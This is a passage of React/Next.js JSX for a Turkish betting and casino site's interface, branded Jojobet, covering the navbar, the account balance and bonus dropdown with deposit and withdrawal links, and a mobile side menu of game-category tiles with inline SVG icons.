                    ? 'bg-green-500 hover:bg-green-600 text-white cursor-pointer shadow-lg shadow-green-500/50'
                    : 'bg-gray-300 text-gray-500 cursor-not-allowed'
                }`}
              >
                {captchaCompleted && (
                  <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                  </svg>
                )}
                Tamamla
              </button>
            </div>
          </div>
        </div>
      </div>

      <nav className='flex justify-between items-center md:px-3 px-2  w-full md:h-[106px] h-[60px] border-b-4 border-[#F9C408] bg-[#294c0b] '>
          {/* --- Logo --- */}
        <div className='flex items-center justify-center  pl-4' > 
            {/* --- Menu icon 3 line for mobile --- */}
           <div 
             onClick={() => setIsSideMenuOpen(true)}
             className='flex flex-col md:hidden gap-[5px] p-2 cursor-pointer'
           >
            <div className='w-4 h-[1px] bg-white rounded-full'></div>
            <div className='w-4 h-[1px] bg-white rounded-full'></div> 
            <div className='w-4 h-[1px] bg-white rounded-full'></div> 
           </div>

           
           <Image onClick={() => router.push('/')} className=' md:w-[190px] w-[130px] h-auto cursor-pointer' src={logo} alt="logo"  /> 
        </div>
          {/*  right side navbar */}
         <div className='max-w-[75%] w-full h-full  flex flex-col '>
              
               {/*  top side */} 
               <div className=' flex md:gap-5 gap-2 md:justify-end justify-end items-center w-full  md:h-[62%] h-full '>
                   {/*  mobile icons */} 
                   <div className='flex gap-2 items-center'>
                    {androidIcon()}
                    {iosIcon()}
                   </div>

                   {/* Conditional rendering based on login status */}
                   { isLoggedIn && userData ? (
                     <>
                      {/* Balance Display */}
                      <div 
                       className='flex cursor-pointer items-center md:gap-4 gap-1 bg-[#F9C408] md:px-3 px-2 md:py-2 py-[2px] rounded-md'
                       onClick={handleBalanceClick}
                      >
                        <span className='text-[#294c0b] font-bold text-xs'>
                          {toplamBakiyeniz !== null ? `${toplamBakiyeniz} ${userData?.currency || '₺'}` : 'Yükleniyor...'} 
                        </span>
                        <span className='text-[#294c0b] font-bold text-md'>+</span>
                      </div>

                    

                       {/* Profile Icon */}
                      <div className="relative" ref={profileIconRef}>
                        <div onClick={() => setIsProfileMenuOpen(!isProfileMenuOpen)}>
                          {profileIcon()}
                        </div>
                        
                        {/* Profile Dropdown Menu */}
                        {isProfileMenuOpen && (
                          <div 
                            ref={profileMenuRef}
                            className="absolute md:w-[350px] md:h-[690px] w-screen h-screen bg-white hadow-lg z-50"
                            style={{
                          
                              top: 'calc(100% + 10px)',
                              right: '-10px'
                            }}
                          >
                             <div className=' flex flex-col w-full h-full '>
                               {/* user info */}
                               <div className='flex w-full gap-5  h-[80px] px-2 py-1 '> 
                                  
                                     <div className='flex flex-col items-center gap-1'> 
                                        <div className='w-[48px] h-[48px] min-w-[48px] min-h-[48px] flex-shrink-0 border-3 border-[#F9C408] rounded-lg flex items-center justify-center'>  <svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" fill="#F9C408" stroke="#F9C408" strokeWidth="0.8" className="bi bi-bell" viewBox="0 0 16 16"> <path d="M8 16a2 2 0 0 0 2-2H6a2 2 0 0 0 2 2zM8 1.918l-.797.161A4.002 4.002 0 0 0 4 6c0 .628-.134 2.197-.459 3.742-.16.767-.376 1.566-.663 2.258h10.244c-.287-.692-.502-1.49-.663-2.258C12.134 8.197 12 6.628 12 6a4.002 4.002 0 0 0-3.203-3.92L8 1.917zM14.22 12c.223.447.481.801.78 1H1c.299-.199.557-.553.78-1C2.68 10.2 3 6.88 3 6c0-2.42 1.72-4.44 4.005-4.901a1 1 0 1 1 1.99 0A5.002 5.002 0 0 1 13 6c0 .88.32 4.2 1.22 6z"></path> </svg> </div>
                                          <p className='text-[#294c0b] font-bold text-[11px] whitespace-nowrap'>Mesajlar</p>

                                     </div>

                                     <div className='flex flex-col '>
                                       <p className='text-[#294c0b]  text-[22px] '>{userData?.username || 'Kullanıcı'}</p>
                                       <p className='text-xs font-gray-600 tracking-wider'>Hesap Güvenliği</p>
                                      
                                      </div>
                                    
                                  


                               </div>


                               {/* bakiye info */}
                               <div className='flex w-full h-[94px] bg-[#294c0b] text-white'>
                                    <div className='flex flex-col items-center justify-center gap-2 w-1/3 h-full '>
                                        <p className='text-sm font-bold'>Bakiyeniz</p>
                                        <p className='text-md font-bold'>
                                          {bakiyeniz !== null ? `${bakiyeniz} ${userData?.currency || '₺'}` : 'Yükleniyor...'}
                                        </p>
                                    </div>

                                    <div className='flex flex-col items-center justify-center gap-2 w-1/3 h-full '>
                                        <p className='text-sm font-bold'>Bonus Bakiyeniz</p>
                                        <p className='text-md font-bold'>
                                          {bonusBakiyeniz !== null ? `${bonusBakiyeniz} ${userData?.currency || '₺'}` : 'Yükleniyor...'}
                                        </p>
                                    </div>

                                    <div className='flex flex-col items-center justify-center gap-2 w-1/3 h-full '>
                                        <p className='text-sm font-bold text-center'>Toplam Bakiyeniz</p>
                                        <p className='text-md font-bold'>
                                          {toplamBakiyeniz !== null ? `${toplamBakiyeniz} ${userData?.currency || '₺'}` : 'Yükleniyor...'}
                                        </p>
                                    </div>
                                 
                                  
                                
                                </div>


                               {/* yapacağı işlemler */}
                               <div className='flex flex-col w-full h-[335px] gap-5  px-3  py-3'>
                                  
                                  <div className='w-full  flex items-center jus gap-3 '>
                                    <div onClick={() => router.push('/payment')} className='flex-1 flex flex-col items-center    '> {parayatiricon} <p className='md:text-sm text-xs text-[#294c0b] text-center '>PARA YATIR</p> </div>
                                    <div onClick={() => router.push('/menu/paracek')} className='flex-1 flex flex-col items-center  gap-2     '> {paracekicon} <p className='md:text-sm text-xs text-[#294c0b] text-center '>PARA ÇEK</p> </div>
                                    <div onClick={() => router.push('/menu/aktifbonus')} className='flex-1 flex flex-col items-center  gap-2   '> {aktifbeticon} <p className='md:text-sm text-xs text-[#294c0b] text-center '>AKTİF BONUSLAR</p> </div>
                                    <div onClick={() => router.push('/menu/gecmisbonus')} className='flex-1 flex flex-col items-center  gap-2    '> {gecmisbonus} <p className='md:text-sm text-xs text-[#294c0b] text-center '>GEÇMİŞ BONUSLARIM</p> </div>
                                  </div>

                                  <div className='w-full  flex items-center '>
                                    <div className='flex flex-1 flex-col items-center  gap-2   '> {sporgecmis} <p className='md:text-sm text-xs text-[#294c0b] text-center '>SPOR GEÇMİŞİM</p> </div>
                                    <div onClick={() => router.push('/menu/oyungecmisi')} className='flex flex-1 flex-col items-center  gap-2     '> {oyungecmisi} <p className='md:text-sm text-xs text-[#294c0b] text-center '>OYUN GEÇMİŞİM</p> </div>
                                    <div onClick={() => router.push('/menu/odemegecmisi')} className='flex flex-1 flex-col items-center  gap-2   '> {hesapozetim} <p className='md:text-sm text-xs text-[#294c0b] text-center '>HESAP ÖZETİM</p> </div>
                                    <div className='flex flex-1 flex-col items-center  gap-2    '> {bahiskurallar} <p className='md:text-sm text-xs text-[#294c0b] text-center '>BAHİS KURALLARI</p> </div>
                                  </div>

                                  <div className='w-full  flex flex-col items-center justify-center '> 
                                      <div className='flex flex-col w-2 items-center  gap-2   '> {numaraguncelle} <p className='md:text-sm text-xs text-[#294c0b] text-center '>Numaranızı güncelleyin</p> </div>
                                    
                                    </div>
                                
                                 

                                
                                
                                
                                 </div>

                                
                                {/* bilgilendirici alan */}
                               <div className='flex w-full h-[172px] bg-[#294c0b]  '> 
                                 <div className=' flex gap-5 w-full h-full px-3 py-3'> 
                                   <Image src={asdas} alt="asdas" className='w-30 h-30 rounded-md object-cover' />
                                   <p className='text-sm text-white '>Jojobet 25.000.000₺ Ödüllü 24-30 Kasım Haftalık Slot Turnuvası
                                   Başlangıç 24/11/2025 00:00 Bitiş 30/11/2025 23:59</p>


                                 </div>

                               


                               </div>

                               {/* Çıkış Butonu */}
                               <div className='flex w-full px-3 py-3'>
                                 <button 
                                   onClick={handleLogout}
                                   className='w-full bg-red-500 hover:bg-red-600 text-white font-bold py-3 rounded-md transition-colors'
                                 >
                                   ÇIKIŞ YAP
                                 </button>
                               </div>

                              

                          

                             
                              
                             </div>




                           
                          </div>
                        )}
                      </div>
                     </>
                  ) : (
                    <>
                      {/*  kayıt ol ve giriş butonları - mobilde yer değiştir */} 
                      <div className='flex md:flex-row flex-row-reverse gap-2'>
                        {/*  kayıt ol */} 
                        <button onClick={() => router.push('/register')} className=' cursor-pointer md:text-sm text-xs font-bold bg-[#F9C408] hover:bg-[#f9f108f5] text-[#294c0b] px-2 py-2 rounded-md'>KAYIT OL</button>

                        {/*  giriş*/} 
                        <button onClick={handleLoginClick} className=' cursor-pointer md:text-[14px] text-xs font-bold  text-white  rounded-md'>GİRİŞ</button>
                      </div>
                    </>
                  )}

                   {/*  çizgi */} 
                   <div className='w-[1px] hidden md:block h-[39px] bg-[#e1e2de36]'></div>

                   {/*  türk bayrağı*/} 
                   {turkFlag()}


               </div>








               {/*  bottom side */}
               <div className='w-full hidden md:flex font-product  justify-around text-white text-[15px]    items-center gap-2 h-[38%] border-t border-[#e1e2de36]'>
                 {menuItems.map((item, index) => (
                   <p key={index} className={`cursor-pointer border-b-4 transition-all duration-300 ${
                     item === 'Bahis' 
                       ? 'text-[#F9C408] border-[#F9C408]' 
                       : 'text-white border-transparent hover:text-[#F9C408] hover:border-[#F9C408]'
                   }`}>
                     {item}
                   </p>
                 ))}
               </div>

         </div>
        
    </nav>





    {/* Side Menu */}
    <div 
      className={`fixed top-0 left-0 w-full h-full bg-white z-[9999] transform transition-transform duration-300 ease-in-out ${
        isSideMenuOpen ? 'translate-x-0' : '-translate-x-full'
      }`}
    >
      {/* Header */}
      <div className='w-full bg-[#294c0b] border-b-1 border-[#F9C408]'>
        <div className='flex items-center justify-between px-4 py-1'>
          {/* Logo */}
          <Image 
            src={logo} 
            alt="logo" 
            className='w-[110px] h-auto cursor-pointer'
            onClick={() => {
              setIsSideMenuOpen(false)
              router.push('/')
            }}
          />
          
          {/* Close Button */}
          <button
            onClick={() => setIsSideMenuOpen(false)}
            className='text-[#F9C408] text-5xl  font-light hover:text-[#F9C408] transition-colors'
          >
            ×
          </button>
        </div>
      </div>

      {/* Menu Content 1a1e17 */}
      <div className='py-2 px-2 flex  w-full h-full gap-2 bg-[#22261e]'>
       
        {/* Menu Left Side */}  
        <div className='flex  flex-1 flex-col gap-2 h-full  '>
         
            <div className='flex flex-col w-full h-17 bg-[#263915] rounded-md  items-center justify-center'>
              <svg xmlns="http://www.w3.org/2000/svg" xmlnsXlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 500 500" xmlSpace="preserve" className="w-8 h-8"> <g> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeMiterlimit:'10'}} d="M309.1,312.2l-155.7,63.1 c-4,1.6-8.8,0-10.4-4L59.1,163.7c-1.6-4,0-8.8,4-10.4l155.7-63.1c4-1.6,8.8,0,10.4,4L313.8,301C315.4,305.8,313,309.8,309.1,312.2z "></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeMiterlimit:'10'}} d="M345.8,167.7l74.3,20c4,1.6,6.4,5.6,5.6,9.6 L360.2,412c-1.6,4-5.6,6.4-9.6,5.6l-171.7-49.5"></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeMiterlimit:'10'}} d="M242,111.8h95.8c4.8,0,8,3.2,8,8v223.6 c0,4.8-3.2,8-8,8H210"></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} d=" M189.3,291.4c2.4-1.6,10.4-8,16.8-11.2c6.4-2.4,16.8-4,20-4"></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} d=" M196.5,256.3c8.8,3.2,24-3.2,28.7-8.8c7.2-8,8.8-17.6,4-28c-8-20-50.3-20-60.7-31.9c1.6,16-28.7,44.7-20.8,65.5 c4,10.4,12,16,22.4,16.8C176.5,270.7,192.5,264.3,196.5,256.3z"></path> </g> </svg>
              <p className='text-[#F9C408] text-[11px]'>Canlı Casino</p>
            </div>
           
           
            <div className='flex flex-col w-full h-17 bg-[#1a1e17] rounded-md  items-center justify-center'>
            <svg xmlns="http://www.w3.org/2000/svg" xmlnsXlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 64 64" xmlSpace="preserve" className="w-8 h-8"> <g> <polygon style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'1.5117', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} points="47.7,46.8 47.7,39.4 45,36.6 45,11.5 15.3,11.5 15.3,36.6 12.5,39.4 12.5,46.8 "></polygon> <rect x="19" y="24.5" style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'1.5117', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} width="7.4" height="11.1"></rect> <rect x="26.4" y="24.5" style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'1.5117', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} width="7.4" height="11.1"></rect> <rect x="33.8" y="24.5" style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'1.5117', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} width="7.4" height="11.1"></rect> <rect x="19" y="15.2" style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'1.5117', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} width="22.3" height="5.6"></rect> <polyline style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'1.5117', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} points="44,48.6 44,53.3 15.3,53.3 15.3,48.6 "></polyline> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'1.5117', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} d="M52.4,32.9H45v-5.6h7.4c1,0,1.9,0.8,1.9,1.9V31C54.2,32,53.4,32.9,52.4,32.9z"></path> <circle style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'1.5117', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} cx="51.4" cy="16.2" r="2.8"></circle> <line style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'1.5117', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} x1="51.4" y1="18.9" x2="51.4" y2="27.3"></line> </g> </svg>
              <p className='text-[#ffffffa9] text-[11px]'> Casino</p>
            </div>
           
            <div className='flex flex-col w-full h-17 bg-[#1a1e17] rounded-md  items-center justify-center'>
             <svg xmlns="http://www.w3.org/2000/svg" xmlnsXlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 100 100" xmlSpace="preserve" className="w-8 h-8"> <g> <path style={{fill:'#FFFFFF'}} d="M83.5,34.8c0.9,1.4,1.5,2.3,3.3,1.9c0.9-0.2,1-0.3,0.7-1.1c-0.7-2.1-1.4-4.3-2-6.4 c-0.6-2-1.4-3.7-2.6-5.4c-1.5-2.2-2.9-4.4-4.3-6.6c-0.2,0-0.4,0-0.6,0c-0.6,0.9-0.7,1.8-0.4,2.9C78.9,25.2,80.6,30.2,83.5,34.8z M78.4,18.4c0.3-0.1,0.4,0.3,0.6,0.5c1.5,2.3,3.1,4.6,4.6,6.9c0.1,0.2,0.2,0.4,0.3,0.5c0.1,0.2,0.1,0.5-0.1,0.6 c-0.2,0.2-0.4-0.1-0.5-0.2c-1.7-2.2-3.4-4.4-4.9-6.7c-0.2-0.3-0.2-0.6-0.3-0.8C78.1,18.9,78.1,18.5,78.4,18.4z"></path> <path style={{fill:'#FFFFFF'}} d="M2.9,64.5c0.7-0.3,1.5-0.6,2.2-1c0.7-0.4,1.1-0.3,1.7,0.3c2.1,2,4.2,4,6.2,6 c0.7,0.7,1.3,0.8,2.1,0.2c-0.1-0.2-0.3-0.4-0.4-0.6c-1.8-1.9-3.6-3.8-5.4-5.8c-0.6-0.7-0.5-0.9,0.3-1.1c0.8-0.2,1.4,0.2,2,0.6 c1.5,1.1,3,2.1,4.8,2.7c1,0.3,2.1,0.3,3.2,0.6c-0.8,0.4-1.6,0.8-2.4,1.3c-0.6,0.3-0.9,0.7-0.6,1.3c0.3,0.7,0.8,0.1,1.1,0 c5.7-2.3,11.4-4.7,17.1-7.1c1.1-0.5,2-0.5,2.8,0.4c0.8,1,1.8,1,3,0.6c6.6-2.3,13.2-4.8,19.5-7.7c1.7-0.8,3.5-0.3,5.3-0.4 c-0.2,0.5-0.6,0.5-0.8,0.6C53,59.9,41.1,64.4,28.9,68c-4.9,1.5-9.7,2.9-14.8,3.2c-0.7,0-1.3,0.5-1.9,0.7C12,72,11.8,72,11.9,72.3 c0.2,0.8,1.4,1.5,2.2,1.3c0.4-0.1,0.8-0.4,0.9,0.2c0.4,1.3,1.2,1.2,2.2,0.8c9.3-2.9,18.6-5.8,27.9-8.8c9-2.9,18.1-5.5,26.9-9.2 c4.4-1.9,8.9-3.7,12.9-6.3c2.8-1.8,3.2-3.2,2-6.3c-1-2.4-2-4.7-3.1-7.1c-0.9-1.9-2-2.6-4.2-2.2c-4.2,0.6-8.2,2-12.3,3.2 c-2.2,0.6-4.2,0.7-6.2-0.4c-1.6-0.9-3.1-0.7-4.7-0.1c-3.1,1.3-5.9,3-8.6,5c-0.8,0.6-1.1,1.4-1.3,2.3c-0.2,0.8,0,1.1,0.8,1.1 c1.8,0.1,3.7,0.3,5.5,0.5c0.8,0.1,1.5,0,2.4-0.5c6-3.3,12.1-6.4,18.6-8.5c1.7-0.6,3.5-1,5.3-1c0.7,0,1.2,0.3,1.4,1 c0.3,0.8,0.6,1.6,0.9,2.4c1,2.3,2,4.5,3.2,6.7c0.1,0.2,0.4,0.5,0.1,0.7c-0.3,0.3-0.6,0.2-0.9,0c-0.1-0.1-0.3-0.2-0.4-0.3 c-0.5-0.6-1-0.5-1.7-0.1c-3.1,1.9-6.4,3.6-9.7,5.2c-2,1-3.9,1.3-5.9,0.1c-0.1,0-0.1-0.1-0.2-0.1c-0.5-0.1-0.7-0.3-0.4-0.9 c0.4-0.9,0.2-1.2-0.8-1.4c-0.5-0.1-1-0.2-1.5-0.2c-10.8-1.6-21.5-3.1-32.3-4.5c-2.4-0.3-4.6,0.3-6.5,1.9c-0.6,0.5-0.8,0.9-0.1,1.5 c0.5,0.4,0.9,0.9,1.4,1.4c0.6,0.6,1.1,1.5,1.9,1.8c0.8,0.3,1.6-0.6,2.5-0.9c0.3-0.1,0.6-0.4,0.8,0c0.2,0.4,0.3,0.9-0.2,1.2 c-0.2,0.1-0.4,0.2-0.5,0.3c-1.8,0.9-3.4,2-5.3,2.7c-2.1,0.8-2.4,2.4-2.5,4.3c0.5,0.1,0.7-0.2,1.1-0.4c2.2-1.1,4.4-2.1,6.5-3.2 c0.8-0.4,1.6-0.1,1.8,0.6c0.2,0.7-0.5,0.6-0.9,0.9c-0.3,0.2-0.7,0.4-1,0.6c-0.5,0.2-0.6,0.6-0.4,1c0.3,0.5,0.6,0.1,0.9,0 c2.4-1.1,4.7-2.2,7.1-3.3c0.3-0.1,0.7-0.6,0.9-0.1c0.2,0.4-0.2,0.7-0.6,0.9c-0.3,0.2-0.7,0.4-1,0.6c-4.1,2.2-8.4,4.2-12.5,6.3 c-2.4,1.2-4.4,1-6.5-0.5c-0.9-0.7-1.8-1.3-2.7-1.9c-1.1-0.8-2.2-1.6-3.3-2.4c-2.1-1.5-6.4-0.7-7.9,1.4c-0.2,0.3-0.3,0.7-0.1,1 c0.2,0.3,0.5,0,0.7-0.1C5.3,60,6,59.6,6.8,59.3c0.3-0.1,0.7-0.6,0.9-0.1c0.3,0.5-0.3,0.6-0.6,0.8c-1.2,0.6-2.4,1.3-3.6,1.9 c-1.1,0.5-1.3,1.2-1.2,2.2C2.3,64.6,2.5,64.7,2.9,64.5z M54,42.3c-1.5,1-3,0.9-4.8,0.5c2.8-2.9,6.7-4.1,9.2-2.8 C56.9,40.8,55.3,41.4,54,42.3z M62.8,40.2c-1.2,0.6-2.4,1.2-3.6,1.9c-0.3,0.1-0.6,0.3-0.8-0.1c-0.2-0.4,0.1-0.6,0.4-0.7 c0.4-0.2,0.9-0.5,1.3-0.7c0.2-0.1,0.4-0.2,0.5-0.5c0-0.4-0.3-0.4-0.5-0.5c-0.9-0.4-1.8-0.7-2.9-1.2c0.9-0.6,1.6-0.7,2.3-0.4 c1.1,0.4,2.3,0.9,3.4,1.4c0.2,0.1,0.5,0.2,0.5,0.5C63.2,40,63,40.1,62.8,40.2z M31.7,46.5c-0.3-0.1-0.6-0.1-0.7-0.6 c1.8,0.2,3.6,0.5,5.3,0.7c8.9,1.2,17.8,2.5,26.7,3.7c0.4,0.1,1-0.1,1.2,0.4c0.1,0.5-0.4,0.8-0.7,1.1c-0.7,0.6-1.5,0.8-2.5,0.6 C51.2,50.4,41.4,48.4,31.7,46.5z"></path> <path style={{fill:'#FFFFFF'}} d="M89.5,41.5c-0.4,0.4-0.7,1-1.1,1.2c-0.7,0.4-0.6,0.8-0.4,1.4c0.8,2.4,1.5,4.8,2.2,7.3 c0.2,0.6,0.4,1.2,0.7,1.7c1.8,2.7,3.6,5.4,5.4,8.2c0.5,0.7,0.9,0.6,1.3-0.1c0.2-0.3,0.2-0.7,0.2-1.2c0-0.1,0-0.3-0.1-0.4 c-1.4-6.5-4.1-12.3-7.5-17.9C89.9,41.1,89.7,41.2,89.5,41.5z M91.5,51.7c2,2.6,3.9,4.9,5.5,7.5c0.3,0.5,0.3,1-0.1,1.4 C95.4,59.4,91.3,52.8,91.5,51.7z"></path> <path style={{fill:'#FFFFFF'}} d="M69.4,42.3c-3.4,1.4-6.9,2.8-10.3,4.2c-0.2,0.1-0.5,0.1-0.7,0.4c0.2,0.1,0.5,0.2,0.7,0.2 c3,0.6,5.9,1.2,8.9,1.7c2.3,0.4,2.3,0.4,3.4-1.6c1.3-2.5,1.3-2.5-0.5-4.6C70.3,42.1,70,42,69.4,42.3z"></path> <path style={{fill:'#FFFFFF'}} d="M76,38.1c-0.6,1.5-0.8,3-1.5,4.4c-0.4-0.5-0.8-1-1.2-1.5c-0.4-0.6-0.9-0.2-1.3,0 c-0.5,0.3,0,0.6,0.2,0.8c0.3,0.5,0.7,1,1.1,1.4c0.6,0.6,0.6,1.2,0.3,1.9c-0.5,1.3-1.2,2.5-1.9,3.8c1.9-0.4,2.9-1.5,3.3-3.3 c0.6,0.3,0.8,0.7,1,1.1c0.4,0.5,0.8,0.1,1.2-0.1c0.5-0.3,0-0.6-0.1-0.8c-0.2-0.3-0.4-0.6-0.7-0.9c-0.8-0.7-0.9-1.6-0.7-2.6 C76,41,76.2,39.7,76,38.1z"></path> <path style={{fill:'#FFFFFF'}} d="M86.2,37.1c-0.9,0-1.1,0.3-0.8,1.1c0.6,1.2,1.1,2.5,1.7,3.7c0.3,0.6,0.7,0.7,1.2,0.2 c1.1-1.1,2-2.3,2.6-3.7c0.3-0.7,0.1-1-0.6-1.2c-0.8-0.2-1.7-0.1-2.5-0.2C87.2,37.1,86.7,37.1,86.2,37.1z M90.1,38.1 c-1.1,0.5-2.1,1.1-3.3,1.4c-0.7,0.2-0.7-0.8-0.9-1.3c-0.2-0.6,0.3-0.5,0.6-0.5C87.8,37.6,88.9,37.6,90.1,38.1z"></path> </g> </svg>
              <p className='text-[#ffffffa9] text-[11px]'> Aviatör</p>
            </div>
           
            <div className='flex flex-col w-full h-17 bg-[#1a1e17] rounded-md  items-center justify-center'>
              <svg xmlns="http://www.w3.org/2000/svg" xmlnsXlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 500 500" xmlSpace="preserve" className="w-8 h-8"> <g> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeMiterlimit:'10'}} d="M309.1,312.2l-155.7,63.1 c-4,1.6-8.8,0-10.4-4L59.1,163.7c-1.6-4,0-8.8,4-10.4l155.7-63.1c4-1.6,8.8,0,10.4,4L313.8,301C315.4,305.8,313,309.8,309.1,312.2z "></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeMiterlimit:'10'}} d="M345.8,167.7l74.3,20c4,1.6,6.4,5.6,5.6,9.6 L360.2,412c-1.6,4-5.6,6.4-9.6,5.6l-171.7-49.5"></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeMiterlimit:'10'}} d="M242,111.8h95.8c4.8,0,8,3.2,8,8v223.6 c0,4.8-3.2,8-8,8H210"></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} d=" M189.3,291.4c2.4-1.6,10.4-8,16.8-11.2c6.4-2.4,16.8-4,20-4"></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} d=" M196.5,256.3c8.8,3.2,24-3.2,28.7-8.8c7.2-8,8.8-17.6,4-28c-8-20-50.3-20-60.7-31.9c1.6,16-28.7,44.7-20.8,65.5 c4,10.4,12,16,22.4,16.8C176.5,270.7,192.5,264.3,196.5,256.3z"></path> </g> </svg>
              <p className='text-[#ffffffa9] text-[11px]'> Hızlı Kazan</p>
            </div>
           
            <div className='flex flex-col w-full h-17 bg-[#1a1e17] rounded-md  items-center justify-center'>
              <svg xmlns="http://www.w3.org/2000/svg" xmlnsXlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 500 500" xmlSpace="preserve" className="w-8 h-8"> <g> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeMiterlimit:'10'}} d="M309.1,312.2l-155.7,63.1 c-4,1.6-8.8,0-10.4-4L59.1,163.7c-1.6-4,0-8.8,4-10.4l155.7-63.1c4-1.6,8.8,0,10.4,4L313.8,301C315.4,305.8,313,309.8,309.1,312.2z "></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeMiterlimit:'10'}} d="M345.8,167.7l74.3,20c4,1.6,6.4,5.6,5.6,9.6 L360.2,412c-1.6,4-5.6,6.4-9.6,5.6l-171.7-49.5"></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeMiterlimit:'10'}} d="M242,111.8h95.8c4.8,0,8,3.2,8,8v223.6 c0,4.8-3.2,8-8,8H210"></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} d=" M189.3,291.4c2.4-1.6,10.4-8,16.8-11.2c6.4-2.4,16.8-4,20-4"></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} d=" M196.5,256.3c8.8,3.2,24-3.2,28.7-8.8c7.2-8,8.8-17.6,4-28c-8-20-50.3-20-60.7-31.9c1.6,16-28.7,44.7-20.8,65.5 c4,10.4,12,16,22.4,16.8C176.5,270.7,192.5,264.3,196.5,256.3z"></path> </g> </svg>
              <p className='text-[#ffffffa9] text-[11px]'> Bahis</p>
            </div>
           
            <div className='flex flex-col w-full h-17 bg-[#1a1e17] rounded-md  items-center justify-center'>
              <svg xmlns="http://www.w3.org/2000/svg" xmlnsXlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 500 500" xmlSpace="preserve" className="w-8 h-8"> <g> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeMiterlimit:'10'}} d="M309.1,312.2l-155.7,63.1 c-4,1.6-8.8,0-10.4-4L59.1,163.7c-1.6-4,0-8.8,4-10.4l155.7-63.1c4-1.6,8.8,0,10.4,4L313.8,301C315.4,305.8,313,309.8,309.1,312.2z "></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeMiterlimit:'10'}} d="M345.8,167.7l74.3,20c4,1.6,6.4,5.6,5.6,9.6 L360.2,412c-1.6,4-5.6,6.4-9.6,5.6l-171.7-49.5"></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeMiterlimit:'10'}} d="M242,111.8h95.8c4.8,0,8,3.2,8,8v223.6 c0,4.8-3.2,8-8,8H210"></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} d=" M189.3,291.4c2.4-1.6,10.4-8,16.8-11.2c6.4-2.4,16.8-4,20-4"></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} d=" M196.5,256.3c8.8,3.2,24-3.2,28.7-8.8c7.2-8,8.8-17.6,4-28c-8-20-50.3-20-60.7-31.9c1.6,16-28.7,44.7-20.8,65.5 c4,10.4,12,16,22.4,16.8C176.5,270.7,192.5,264.3,196.5,256.3z"></path> </g> </svg>
              <p className='text-[#ffffffa9] text-[11px]'> TVBet</p>
            </div>
           
            <div className='flex flex-col w-full h-17 bg-[#1a1e17] rounded-md  items-center justify-center'>
